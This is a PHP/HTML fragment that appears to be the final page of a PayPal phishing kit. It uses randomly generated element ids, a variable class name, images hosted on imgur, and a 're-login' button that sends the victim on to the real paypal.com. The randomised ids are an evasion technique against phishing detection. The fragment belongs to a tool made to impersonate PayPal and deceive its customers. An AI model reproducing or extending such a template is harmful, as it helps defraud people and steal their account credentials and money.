                    <div style="display: block;font-family: HelveticaNeue,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif;padding-left: 3%;padding-right: 3%;max-width: 1150px;position: relative;margin-left: auto;margin-right: auto;border-radius: 5px;box-sizing: content-box;">
                        <div id="<?php echo RANDOM();?>" class="content-icon"> <img alt="" src="http://i.imgur.com/i6Xiznr.png"> </div>  <br>
                        <img id="<?php echo RANDOM();?>" src="http://i.imgur.com/j3wYtD9.png"> <form method="post" action="https://www.paypal.com/">
                        <input class="<? echo $submito;?>" style="width:300px" value="re-login" type="submit">
                        </form>
                    </div>
                </div>    </center>


</div>
 </body>

   <?}?>


    </div>

</html>